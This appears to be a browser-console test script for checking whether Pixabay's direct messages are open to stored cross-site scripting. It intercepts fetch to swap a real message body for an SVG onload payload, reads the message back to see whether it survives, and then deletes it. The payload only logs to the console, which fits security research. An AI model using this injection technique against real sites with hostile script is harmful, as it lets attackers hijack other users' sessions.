// ==============================================================
// Stored-XSS probe (Pixabay DMs) — run in LibreWolf DevTools console
// Step 1 = account A, on B's compose page · Step 2 = account B · Step 3 = cleanup
// ==============================================================

const PAYLOAD = '<svg onload="console.log(\'XSSPROBE-FIRED\')">';

// ---------- STEP 1: account A (58216674), logged in, on B's compose page ----------
// B = samthediver-58231454. The interceptor keeps the REAL compose request intact
// (security_hash + turnstile-response ride through untouched — fresh nonces from
// this page load) and only swaps the `text` field for PAYLOAD.
const _origFetch = window.fetch;
window.fetch = (url, opts) => {
  try {
    const u = String(url);
    if (u.includes('/accounts/messages/compose/') && opts && opts.body instanceof FormData) {
      const fd = new FormData();
      for (const [k, v] of opts.body.entries()) if (k !== 'text') fd.append(k, v);
      fd.append('text', PAYLOAD);
      opts = { ...opts, body: fd };
    }
  } catch {} // never break a real request
  return _origFetch(url, opts);
};
// Then: type any subject in the compose box and press SEND. Outgoing `text` becomes PAYLOAD.

// ---------- STEP 2: account B (samthediver-58231454), console ----------
const readConversation = async () => {
  for (const p of ['/en/accounts/messages/conversations/58216674/', '/accounts/messages/conversations/58216674/']) {
    const r = await fetch(p, { headers: { accept: 'application/json' } });
    if (r.ok) {
      const j = await r.json();
      const m = j.messages.at(-1);
      console.log('path           :', p);
      console.log('last message id:', m.id);
      console.log('served text   :', JSON.stringify(m.text));
      return m.id;
    }
  }
  throw new Error('conversation read failed on both prefixes');
};
readConversation().then(id => { window.__msgId = id; });
// VERDICT: if the SVG payload survives VERBATIM in `text` → stored XSS PROVEN
// (sink chunk-messages @9946 renders it via dangerouslySetInnerHTML, no sanitize).
// If tags/quotes are altered or stripped → server-side gate holds.

// ---------- STEP 3: cleanup — hide the probe message from BOTH sides ----------
const csrf = () => (document.cookie.match(/\bcsrftoken=([^;]+)/) || [])[1];
const del = async (id) => {
  for (const p of [`/en/accounts/messages/status/${id}/?action=delete`, `/accounts/messages/status/${id}/?action=delete`]) {
    const r = await fetch(p, { method: 'POST', headers: { 'x-csrftoken': csrf() } });
    console.log('delete status:', r.status, p);
    if (r.ok || r.status === 403) return; // 403 = Cloudflare (retry in browser) / otherwise try next prefix
  }
};
// Run: del(window.__msgId) first in A's session, then again in B's session.
